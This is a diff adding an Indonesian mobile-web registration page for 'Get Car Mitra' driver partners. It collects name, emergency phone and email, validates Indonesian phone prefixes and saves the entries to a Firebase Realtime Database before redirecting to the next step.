@@ -1,0 +1,716 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+<meta name="theme-color" content="#0a1628" />
+<title>Get Car Mitra — Lengkapi Data Diri</title>
+
+<!-- 🔤 Font -->
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+
+<!-- 🔥 Firebase -->
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+<!-- 📷 Cek foto latar — jika gagal dimuat, tetap pakai gradasi navy -->
+<script>
+  const BG_URL = "https://images.unsplash.com/photo-1449965408869-eaa3f722e40d?auto=format&fit=crop&w=1600&q=80";
+  const bg = new Image();
+  bg.onload = () => document.body.classList.add("has-photo");
+  bg.src = BG_URL;
+</script>
+
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  :root {
+    --navy: #0a1628;
+    --accent: #2f7bff;
+    --accent-deep: #0f5ae0;
+    --white: #ffffff;
+    --glass: rgba(255, 255, 255, 0.10);
+    --glass-border: rgba(255, 255, 255, 0.22);
+  }
+
+  html, body { height: 100%; }
+
+  body {
+    font-family: 'Plus Jakarta Sans', sans-serif;
+    background: var(--navy);
+    color: var(--white);
+    display: flex;
+    justify-content: center;
+    overflow: hidden;
+  }
+
+  /* 🔹 Ukuran handphone, di komputer tetap di tengah */
+  .phone { width: 100%; max-width: 430px; height: 100dvh; overflow: hidden; }
+
+  .hero {
+    position: relative;
+    height: 100%;
+    display: flex;
+    flex-direction: column;
+    background: linear-gradient(160deg, #0d1f3c 0%, #0a1628 55%, #060d1a 100%);
+    overflow: hidden;
+  }
+
+  body.has-photo .hero {
+    background-image:
+      linear-gradient(180deg, rgba(6,13,26,0.82) 0%, rgba(6,13,26,0.86) 50%, rgba(6,13,26,0.95) 100%),
+      url("https://images.unsplash.com/photo-1449965408869-eaa3f722e40d?auto=format&fit=crop&w=1600&q=80");
+    background-size: cover;
+    background-position: center;
+  }
+
+  /* ✨ Cahaya aksen biru */
+  .glow { position: absolute; border-radius: 50%; filter: blur(90px); pointer-events: none; }
+  .glow-1 { width: 320px; height: 320px; background: rgba(47,123,255,0.28); top: -100px; right: -100px; }
+  .glow-2 { width: 280px; height: 280px; background: rgba(47,123,255,0.16); bottom: 60px; left: -120px; }
+
+  /* 🔹 Navbar */
+  .navbar {
+    position: relative;
+    display: flex;
+    align-items: center;
+    padding: calc(14px + env(safe-area-inset-top)) 20px 14px;
+    z-index: 10;
+  }
+
+  .back-btn {
+    width: 38px; height: 38px;
+    display: flex; align-items: center; justify-content: center;
+    border-radius: 12px;
+    background: rgba(255,255,255,0.10);
+    border: 1px solid rgba(255,255,255,0.18);
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+    color: var(--white);
+    cursor: pointer;
+    transition: transform 0.15s ease, background 0.2s ease;
+  }
+  .back-btn:hover  { background: rgba(255,255,255,0.18); }
+  .back-btn:active { transform: scale(0.92); }
+  .back-btn svg { width: 18px; height: 18px; }
+
+  .brand {
+    position: absolute;
+    left: 50%;
+    transform: translateX(-50%);
+    font-size: 15px;
+    font-weight: 800;
+    letter-spacing: 0.5px;
+    white-space: nowrap;
+    color: var(--white);
+  }
+  .brand span { color: var(--accent); }
+
+  .version {
+    margin-left: auto;
+    font-size: 11px;
+    font-weight: 600;
+    letter-spacing: 0.4px;
+    color: rgba(255,255,255,0.85);
+    background: rgba(255,255,255,0.12);
+    border: 1px solid rgba(255,255,255,0.18);
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+    padding: 5px 12px;
+    border-radius: 20px;
+  }
+
+  /* 🔹 Konten */
+  .content {
+    position: relative;
+    z-index: 10;
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    padding: 6px 26px calc(20px + env(safe-area-inset-bottom));
+    overflow-y: auto;
+  }
+
+  .eyebrow {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: rgba(255,255,255,0.75);
+    margin: 14px 0 10px;
+  }
+  .eyebrow::before {
+    content: "";
+    width: 22px;
+    height: 2px;
+    background: var(--accent);
+    border-radius: 2px;
+  }
+
+  h1 {
+    font-size: clamp(24px, 6.5vw, 30px);
+    font-weight: 800;
+    line-height: 1.2;
+    letter-spacing: -0.5px;
+    margin-bottom: 8px;
+    text-shadow: 0 2px 20px rgba(0,0,0,0.35);
+  }
+  h1 span {
+    background: linear-gradient(90deg, #6db3ff, #2f7bff);
+    -webkit-background-clip: text;
+    background-clip: text;
+    -webkit-text-fill-color: transparent;
+  }
+
+  .desc {
+    font-size: 14px;
+    line-height: 1.6;
+    color: rgba(255,255,255,0.75);
+    max-width: 320px;
+    margin-bottom: 20px;
+  }
+  .desc b { color: var(--white); font-weight: 700; }
+
+  /* 🔹 Info box — kaca biru lembut */
+  .info-box {
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    background: rgba(47,123,255,0.12);
+    border: 1px solid rgba(47,123,255,0.30);
+    backdrop-filter: blur(14px);
+    -webkit-backdrop-filter: blur(14px);
+    border-radius: 16px;
+    padding: 14px 16px;
+    margin-bottom: 16px;
+  }
+  .info-box svg {
+    width: 20px; height: 20px;
+    flex-shrink: 0;
+    color: #6db3ff;
+    margin-top: 1px;
+  }
+  .info-box p {
+    font-size: 12.5px;
+    line-height: 1.6;
+    color: rgba(255,255,255,0.85);
+  }
+  .info-box b { color: var(--white); font-weight: 700; }
+
+  /* 🔹 Kartu kendaraan terpilih */
+  .vehicle-chip {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 14px;
+    padding: 14px 16px;
+    border-radius: 18px;
+    background: var(--glass);
+    border: 1.5px solid var(--glass-border);
+    backdrop-filter: blur(20px) saturate(140%);
+    -webkit-backdrop-filter: blur(20px) saturate(140%);
+    margin-bottom: 16px;
+    cursor: pointer;
+    transition: background 0.25s ease, border-color 0.25s ease;
+  }
+  .vehicle-chip:hover { background: rgba(255,255,255,0.14); }
+
+  .vehicle-left { display: flex; align-items: center; gap: 14px; }
+
+  /* 📸 FOTO ASLI KENDARAAN — thumbnail bulat, bukan kartun */
+  .vehicle-thumb {
+    width: 52px; height: 52px;
+    flex-shrink: 0;
+    border-radius: 50%;
+    overflow: hidden;
+    border: 1.5px solid rgba(255,255,255,0.30);
+    box-shadow: 0 6px 18px rgba(0,0,0,0.35);
+    background: linear-gradient(135deg, #16305c, #0d1f3c);
+    position: relative;
+  }
+  .vehicle-thumb img {
+    width: 100%; height: 100%;
+    object-fit: cover;
+    display: block;
+  }
+  /* Fallback SVG jika foto gagal dimuat */
+  .vehicle-thumb svg {
+    display: none;
+    position: absolute;
+    inset: 0;
+    margin: auto;
+    width: 26px; height: 26px;
+    color: rgba(255,255,255,0.85);
+  }
+  .vehicle-thumb.no-photo img { display: none; }
+  .vehicle-thumb.no-photo svg { display: block; }
+
+  .vehicle-name { font-size: 15px; font-weight: 800; letter-spacing: 0.2px; }
+  .vehicle-sub  { font-size: 12px; color: rgba(255,255,255,0.6); margin-top: 1px; }
+
+  .vehicle-badge {
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 0.3px;
+    color: #6db3ff;
+    background: rgba(47,123,255,0.16);
+    border: 1px solid rgba(47,123,255,0.35);
+    padding: 6px 14px;
+    border-radius: 20px;
+    flex-shrink: 0;
+    transition: background 0.2s ease;
+  }
+  .vehicle-chip:hover .vehicle-badge { background: rgba(47,123,255,0.28); }
+
+  /* 🔹 Panel form — kaca buram */
+  .form-card {
+    background: var(--glass);
+    border: 1px solid var(--glass-border);
+    backdrop-filter: blur(20px) saturate(140%);
+    -webkit-backdrop-filter: blur(20px) saturate(140%);
+    border-radius: 24px;
+    padding: 24px 20px;
+    box-shadow: 0 20px 50px rgba(0,0,0,0.35);
+  }
+
+  .field { margin-bottom: 20px; }
+  .field:last-of-type { margin-bottom: 4px; }
+
+  .label {
+    display: block;
+    font-size: 13px;
+    font-weight: 700;
+    color: rgba(255,255,255,0.9);
+    margin-bottom: 8px;
+  }
+  .label .req { color: #ff7b7b; }
+
+  .input-group {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    background: rgba(255,255,255,0.08);
+    border: 1.5px solid rgba(255,255,255,0.22);
+    border-radius: 14px;
+    padding: 13px 16px;
+    transition: border-color 0.2s ease, box-shadow 0.2s ease;
+  }
+  .input-group:focus-within {
+    border-color: var(--accent);
+    box-shadow: 0 0 0 4px rgba(47,123,255,0.22);
+  }
+  .input-group.error-shake {
+    animation: shake 0.4s ease;
+    border-color: #ff6b6b;
+  }
+  .input-group.locked {
+    background: rgba(255,255,255,0.05);
+    border-style: dashed;
+    opacity: 0.75;
+  }
+
+  .prefix  { font-size: 14px; font-weight: 700; color: rgba(255,255,255,0.9); }
+  .divider { width: 1px; height: 20px; background: rgba(255,255,255,0.25); }
+  .lock-icon { width: 14px; height: 14px; color: rgba(255,255,255,0.45); flex-shrink: 0; }
+
+  .input {
+    flex: 1;
+    min-width: 0;
+    background: transparent;
+    border: none;
+    outline: none;
+    color: var(--white);
+    font-family: inherit;
+    font-size: 16px; /* 16px agar iOS tidak auto-zoom */
+    font-weight: 600;
+    letter-spacing: 0.5px;
+  }
+  .input::placeholder { color: rgba(255,255,255,0.35); font-weight: 500; letter-spacing: 0.3px; }
+  .input:read-only { color: rgba(255,255,255,0.65); }
+
+  .hint {
+    font-size: 11.5px;
+    color: rgba(255,255,255,0.5);
+    margin-top: 8px;
+    line-height: 1.5;
+  }
+
+  /* 🔹 Tombol */
+  .btn {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    width: 100%;
+    padding: 15px;
+    margin-top: 20px;
+    border: none;
+    border-radius: 16px;
+    font-family: inherit;
+    font-size: 15px;
+    font-weight: 700;
+    letter-spacing: 0.2px;
+    cursor: pointer;
+    transition: transform 0.15s ease, box-shadow 0.25s ease, opacity 0.2s ease;
+  }
+  .btn:active { transform: scale(0.97); }
+  .btn svg { width: 18px; height: 18px; flex-shrink: 0; }
+
+  .btn-primary {
+    background: linear-gradient(135deg, var(--accent), var(--accent-deep));
+    color: var(--white);
+    box-shadow: 0 8px 24px rgba(47,123,255,0.4);
+  }
+  .btn-primary:hover { box-shadow: 0 10px 30px rgba(47,123,255,0.55); }
+  .btn-primary:disabled {
+    opacity: 0.65;
+    cursor: not-allowed;
+    transform: none;
+    box-shadow: none;
+  }
+
+  .spinner {
+    width: 18px; height: 18px;
+    border: 2.5px solid rgba(255,255,255,0.35);
+    border-top-color: var(--white);
+    border-radius: 50%;
+    animation: spin 0.7s linear infinite;
+  }
+
+  .status {
+    min-height: 20px;
+    margin-top: 14px;
+    font-size: 13px;
+    font-weight: 500;
+    line-height: 1.55;
+    text-align: center;
+    color: rgba(255,255,255,0.7);
+  }
+  .status.sukses { color: #7ee2a8; }
+  .status.error  { color: #ff9b9b; }
+
+  .copyright {
+    margin-top: auto;
+    padding-top: 20px;
+    text-align: center;
+    font-size: 11px;
+    color: rgba(255,255,255,0.45);
+    user-select: none;
+  }
+
+  /* 🔹 Animasi */
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(24px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  @keyframes shake {
+    0%, 100% { transform: translateX(0); }
+    20% { transform: translateX(-6px); }
+    40% { transform: translateX(6px); }
+    60% { transform: translateX(-4px); }
+    80% { transform: translateX(4px); }
+  }
+
+  .navbar       { animation: fadeUp 0.6s ease both; }
+  .eyebrow      { animation: fadeUp 0.7s 0.2s ease both; }
+  h1            { animation: fadeUp 0.7s 0.3s ease both; }
+  .desc         { animation: fadeUp 0.7s 0.4s ease both; }
+  .info-box     { animation: fadeUp 0.7s 0.45s ease both; }
+  .vehicle-chip { animation: fadeUp 0.7s 0.5s ease both; }
+  .form-card    { animation: fadeUp 0.7s 0.55s ease both; }
+  .copyright    { animation: fadeUp 0.7s 0.7s ease both; }
+
+  @media (max-width: 360px) {
+    .content { padding-left: 20px; padding-right: 20px; }
+    .form-card { padding: 20px 16px; }
+  }
+</style>
+</head>
+<body>
+
+  <div class="phone">
+    <div class="hero">
+
+      <div class="glow glow-1"></div>
+      <div class="glow glow-2"></div>
+
+      <!-- 🔹 Navbar -->
+      <nav class="navbar">
+        <button class="back-btn" onclick="history.back()" aria-label="Kembali">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5"/><polyline points="12 19 5 12 12 5"/></svg>
+        </button>
+        <div class="brand">Get <span>Car</span></div>
+        <div class="version">V1.103.1</div>
+      </nav>
+
+      <!-- 🔹 Konten -->
+      <div class="content">
+        <div class="eyebrow">Langkah Terakhir</div>
+        <h1>Lengkapi Data <span>Diri</span></h1>
+        <p class="desc">Satu langkah lagi! Isi data di bawah ini dengan benar sesuai dokumen resmi Anda.</p>
+
+        <!-- 🔹 Info Deadline -->
+        <div class="info-box">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+          <p>Mohon lengkapi data Anda sebelum <b id="deadline">-</b>. Jika tidak, data Anda akan dihapus dari sistem. Anda tetap bisa mendaftar ulang kapan saja.</p>
+        </div>
+
+        <!-- 🔹 Kendaraan Terpilih (foto asli, bukan kartun) -->
+        <div class="vehicle-chip" onclick="history.back()" title="Ganti kendaraan">
+          <div class="vehicle-left">
+            <div class="vehicle-thumb" id="vehicleThumb">
+              <img id="vehicleImg" alt="Mobil"
+                   src="https://images.unsplash.com/photo-1502877338535-766e1452684a?auto=format&fit=crop&w=200&q=80" />
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M5 11l1.5-4.5A2 2 0 0 1 8.4 5h7.2a2 2 0 0 1 1.9 1.5L19 11"/><path d="M3 16v-3a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2v3"/><circle cx="7" cy="16.5" r="1.8"/><circle cx="17" cy="16.5" r="1.8"/></svg>
+            </div>
+            <div>
+              <div class="vehicle-name">Mobil</div>
+              <div class="vehicle-sub">Mendaftar sebagai</div>
+            </div>
+          </div>
+          <span class="vehicle-badge">Ganti</span>
+        </div>
+
+        <!-- 🔹 Panel Form -->
+        <form id="registerForm" class="form-card" novalidate>
+
+          <div class="field">
+            <label class="label" for="nama">Nama Lengkap <span class="req">*</span></label>
+            <div class="input-group" id="groupNama">
+              <input type="text" id="nama" class="input" placeholder="Cth: Adit Suradit" autocomplete="name" />
+            </div>
+            <p class="hint">Harap isi dengan nama sesuai KTP.</p>
+          </div>
+
+          <div class="field">
+            <label class="label" for="nohp">Nomor HP Utama</label>
+            <div class="input-group locked" id="groupNohp">
+              <span class="prefix">+62</span>
+              <div class="divider"></div>
+              <input type="tel" id="nohp" class="input" placeholder="81234567890" readonly />
+              <svg class="lock-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+            </div>
+            <p class="hint">Nomor terverifikasi dari langkah OTP — tidak dapat diubah.</p>
+          </div>
+
+          <div class="field">
+            <label class="label" for="darurat">Nomor Telepon Darurat <span class="req">*</span></label>
+            <div class="input-group" id="groupDarurat">
+              <span class="prefix">+62</span>
+              <div class="divider"></div>
+              <input type="tel" id="darurat" class="input" maxlength="12" inputmode="numeric" placeholder="81212000000" />
+            </div>
+            <p class="hint">Untuk menghubungi Anda jika nomor utama tidak aktif.</p>
+          </div>
+
+          <div class="field">
+            <label class="label" for="email">Alamat Email <span class="req">*</span></label>
+            <div class="input-group" id="groupEmail">
+              <input type="email" id="email" class="input" placeholder="Cth: email@mail.com" autocomplete="email" />
+            </div>
+            <p class="hint">Pastikan email aktif untuk menerima informasi pendaftaran.</p>
+          </div>
+
+          <button type="submit" id="btnSubmit" class="btn btn-primary">
+            <svg id="btnIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
+            <span id="btnSpinner" class="spinner" style="display:none"></span>
+            <span id="btnText">Lanjut</span>
+          </button>
+
+          <p id="status" class="status"></p>
+        </form>
+
+        <div class="copyright">Hak Cipta © PT Bali Global Trans</div>
+      </div>
+
+    </div>
+  </div>
+
+<script>
+  // ================= KONFIGURASI FIREBASE =================
+  const firebaseConfig = {
+    apiKey: "AIzaSyD3FQbFF5a91MlASpqImTMmGkYvaTcdxm0",
+    authDomain: "kadek-ed34e.firebaseapp.com",
+    databaseURL: "https://kadek-ed34e-default-rtdb.firebaseio.com",
+    projectId: "kadek-ed34e",
+    storageBucket: "kadek-ed34e.firebasestorage.app",
+    messagingSenderId: "65756136303",
+    appId: "1:65756136303:web:6dbe5bc658fadb05ca1e9a",
+    measurementId: "G-5WSR57JC7V"
+  };
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+
+  // ================= ELEMEN =================
+  const form        = document.getElementById("registerForm");
+  const namaEl      = document.getElementById("nama");
+  const nohpEl      = document.getElementById("nohp");
+  const daruratEl   = document.getElementById("darurat");
+  const emailEl     = document.getElementById("email");
+  const btnSubmit   = document.getElementById("btnSubmit");
+  const btnText     = document.getElementById("btnText");
+  const btnIcon     = document.getElementById("btnIcon");
+  const btnSpinner  = document.getElementById("btnSpinner");
+  const statusEl    = document.getElementById("status");
+  const vehicleImg  = document.getElementById("vehicleImg");
+  const vehicleThumb = document.getElementById("vehicleThumb");
+
+  // ================= AMBIL NOMOR DARI URL (dari halaman OTP/kota) =================
+  const params = new URLSearchParams(window.location.search);
+  let telepon = (params.get("telepon") || "").trim();
+
+  // Normalisasi ke +62...
+  if (telepon.startsWith("0"))       telepon = "+62" + telepon.slice(1);
+  else if (telepon.startsWith("62")) telepon = "+" + telepon;
+  else if (telepon.startsWith("8"))  telepon = "+62" + telepon;
+
+  // 🔧 Perbaikan bug: sebelumnya hardcoded "81234567890" — sekarang dari URL
+  nohpEl.value = telepon ? telepon.replace("+62", "") : "";
+
+  // ================= FOTO KENDARAAN — fallback jika gagal dimuat =================
+  vehicleImg.addEventListener("error", () => vehicleThumb.classList.add("no-photo"));
+  vehicleImg.addEventListener("load",  () => vehicleThumb.classList.remove("no-photo"));
+
+  // ================= DEADLINE — 20 HARI KERJA =================
+  function hitungDeadline() {
+    let today = new Date();
+    let added = 0;
+    while (added < 20) {
+      today.setDate(today.getDate() + 1);
+      const day = today.getDay();
+      if (day !== 0 && day !== 6) added++; // lewati Minggu & Sabtu
+    }
+    const options = { day: "2-digit", month: "short", year: "numeric" };
+    document.getElementById("deadline").textContent = today.toLocaleDateString("id-ID", options);
+  }
+  hitungDeadline();
+
+  // ================= HELPER =================
+  function setStatus(pesan, tipe) {
+    statusEl.textContent = pesan;
+    statusEl.className = "status" + (tipe ? " " + tipe : "");
+  }
+
+  function setLoading(aktif) {
+    btnSubmit.disabled = aktif;
+    btnText.textContent = aktif ? "Menyimpan..." : "Lanjut";
+    btnIcon.style.display = aktif ? "none" : "block";
+    btnSpinner.style.display = aktif ? "block" : "none";
+  }
+
+  function gagal(groupEl, pesan) {
+    setStatus(pesan, "error");
+    groupEl.classList.remove("error-shake");
+    void groupEl.offsetWidth; // restart animasi
+    groupEl.classList.add("error-shake");
+    groupEl.querySelector(".input").focus();
+  }
+
+  // Filter huruf di input darurat
+  daruratEl.addEventListener("input", () => {
+    daruratEl.value = daruratEl.value.replace(/\D/g, "");
+    document.getElementById("groupDarurat").classList.remove("error-shake");
+  });
+
+  // ================= SUBMIT =================
+  const validPrefixes = [
+    "811","812","813","814","815","816","817","818","819",
+    "821","822","823",
+    "851","852","853","855","856","857","858","859",
+    "877","878","879",
+    "881","882","883","884","885","886","887","888","889"
+  ];
+
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    const nama    = namaEl.value.trim();
+    const darurat = daruratEl.value.trim();
+    const email   = emailEl.value.trim();
+
+    // 1️⃣ Nama wajib diisi (min. 3 huruf)
+    if (nama.length < 3) {
+      gagal(document.getElementById("groupNama"), "Nama lengkap wajib diisi (min. 3 karakter)!");
+      return;
+    }
+
+    // 2️⃣ Nomor darurat wajib & valid
+    if (!darurat) {
+      gagal(document.getElementById("groupDarurat"), "Nomor telepon darurat wajib diisi!");
+      return;
+    }
+    if (darurat.length < 11 || darurat.length > 12) {
+      gagal(document.getElementById("groupDarurat"), "Nomor darurat harus 11 atau 12 digit!");
+      return;
+    }
+    if (!validPrefixes.includes(darurat.substring(0, 3))) {
+      gagal(document.getElementById("groupDarurat"), "Nomor darurat bukan nomor Indonesia yang valid!");
+      return;
+    }
+    if (telepon && telepon === "+62" + darurat) {
+      gagal(document.getElementById("groupDarurat"), "Nomor darurat tidak boleh sama dengan nomor utama!");
+      return;
+    }
+
+    // 3️⃣ Email harus format valid
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+      gagal(document.getElementById("groupEmail"), "Format email tidak valid!");
+      return;
+    }
+
+    setLoading(true);
+    setStatus("Menyimpan data Anda...");
+
+    const dataMitra = {
+      nama: nama,
+      telepon: telepon || "-",
+      telepon_darurat: "+62" + darurat,
+      email: email,
+      kendaraan: "Mobil",
+      tanggal_daftar: new Date().toLocaleString("id-ID"),
+      deadline: document.getElementById("deadline").textContent
+    };
+
+    try {
+      // 🔹 Update record pendaftaran yang sudah ada (berdasarkan nomor OTP)
+      if (telepon) {
+        const snap = await db.ref("pendaftaran")
+          .orderByChild("telepon").equalTo(telepon).once("value");
+
+        if (snap.exists()) {
+          const updates = {};
+          snap.forEach(child => {
+            updates[child.key + "/nama"]   = nama;
+            updates[child.key + "/email"]  = email;
+            updates[child.key + "/darurat"] = "+62" + darurat;
+            updates[child.key + "/status"] = "data_lengkap";
+          });
+          await db.ref("pendaftaran").update(updates);
+        }
+      }
+
+      // 🔹 Arsip ke pendaftaran_mitra (seperti kode asli)
+      await db.ref("pendaftaran_mitra").push(dataMitra);
+
+      setStatus("Data tersimpan! Mengalihkan...", "sukses");
+
+      const tujuan = "halaman-berikutnya.html" +
+        (telepon ? "?telepon=" + encodeURIComponent(telepon) : "");
+
+      setTimeout(() => window.location.href = tujuan, 1200);
+
+    } catch (err) {
+      setLoading(false);
+      setStatus("Gagal menyimpan data: " + err.message, "error");
+    }
+  });
+</script>
+
+</body>
+</html>
